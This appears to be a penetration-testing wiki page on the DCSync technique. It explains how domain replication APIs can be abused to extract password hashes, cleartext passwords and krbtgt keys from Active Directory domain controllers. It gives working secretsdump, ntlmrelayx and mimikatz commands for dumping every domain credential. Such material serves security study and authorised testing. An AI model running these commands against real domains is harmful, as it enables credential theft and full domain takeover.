---
description: MITRE ATT&CK™ Sub-technique T1003.006
---

# DCSync

## Theory

DCSync is a technique that uses Windows Domain Controller's API to simulate the replication process from a remote domain controller. This attack can lead to the compromise of major credential material such as the Kerberos `krbtgt` keys used legitimately for tickets creation, but also for [tickets forging](../../kerberos/forged-tickets/) by attackers. The consequences of this attack are similar to an [NTDS.dit dump and parsing](ntds.md) but the practical aspect differ. **A DCSync is not a simple copy & parse of the NTDS.dit file**, it's a `DsGetNCChanges` operation transported in an RPC request to the DRSUAPI (Directory Replication Service API) to replicate data (including credentials) from a domain controller.

**This attack requires domain admin privileges** to succeed (more specifically, it needs the following extended privileges: `DS-Replication-Get-Changes`  and `DS-Replication-Get-Changes-All`). Members of the Administrators, Domain Admins, Enterprise Admins, and Domain Controllers groups have these privileges by default. In some cases, over-privileged accounts can be abused to [grant controlled objects the right to DCSync](../../dacl/grant-rights.md).

{% hint style="info" %}
A setting exists in the account policy or when creating users telling the domain controller to store the user's password using reversible encryption instead of irreversible hashing. This allows attackers to retrieve the passwords in clear-text.
{% endhint %}

## Practice

{% tabs %}
{% tab title="UNIX-like" %}
On UNIX-like systems, this attack can be carried out with [Impacket](https://github.com/SecureAuthCorp/impacket/)'s [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) which has the ability to run this attack on an elevated context obtained through [plaintext password stuffing](../bruteforcing/stuffing.md), [pass-the-hash](../../ntlm/pth.md) or [pass-the-ticket](../../kerberos/ptt.md).

```bash
# using a plaintext password
secretsdump -outputfile 'something' 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'

# with Pass-the-Hash
secretsdump -outputfile 'something' -hashes 'LMhash':'NThash' 'DOMAIN'/'USER'@'DOMAINCONTROLLER'

# with Pass-the-Ticket
secretsdump -k -outputfile 'something' 'DOMAIN'/'USER'@'DOMAINCONTROLLER'
```

The secretsdump script creates the following files.

| File       | Content                                                   |
| ---------- | --------------------------------------------------------- |
| .ntds      | LM and NT password hashes                                 |
| .cleartext | Passwords stored using reversible encryption              |
| .kerberos  | Kerberos keys (DES, AES128 and AES256)                    |
| .sam       | Domain controller's [SAM secrets](sam-and-lsa-secrets.md) |
| .secrets   | Domain controller's [LSA secrets](sam-and-lsa-secrets.md) |

This attack can also be operated with a [relayed NTLM authentication](../../ntlm/relay.md), but only if the target domain controller is vulnerable to [Zerologon](../../netlogon/zerologon.md) since the DRSUAPI always requires signing.

```bash
# target vulnerable to Zerologon, dump DC's secrets only
ntlmrelayx.py -t dcsync://'DOMAINCONTROLLER'

# target vulnerable to Zerologon, dump Domain's secrets
ntlmrelayx.py -t dcsync://'DOMAINCONTROLLER' -auth-smb 'DOMAIN'/'LOW_PRIV_USER':'PASSWORD'
```
{% endtab %}

{% tab title="Windows" %}
On Windows, [mimikatz](https://github.com/gentilkiwi/mimikatz) (C) can be used [`lsadump::dcsync`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/dcsync) to operate a DCSync and recover the `krbtgt` keys for a [golden ticket attack](../../kerberos/forged-tickets/#golden-ticket) for example. For this attack to work, the following mimikatz command should run in an elevated context (i.e. through runas with plaintext password, [pass-the-hash](../../ntlm/pth.md) or [pass-the-ticket](../../kerberos/ptt.md)).

```bash
# Extract a specific user, in this case the krbtgt
lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:krbtgt

# Dump everything (printed in a short and readable format)
lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /all /csv
```
{% endtab %}
{% endtabs %}

{% hint style="info" %}
For an undocumented reason, Impacket's secretsdump relies on SMB before doing a DCSync (hence requiring a `CIFS/domaincontroller` SPN when using Kerberos tickets) while Mimikatz relies on LDAP before doing the DCSync (hence requiring a `LDAP/domaincontroller` SPN when using Kerberos tickets)
{% endhint %}

## Resources

{% embed url="https://attack.stealthbits.com/privilege-escalation-using-mimikatz-dcsync" %}
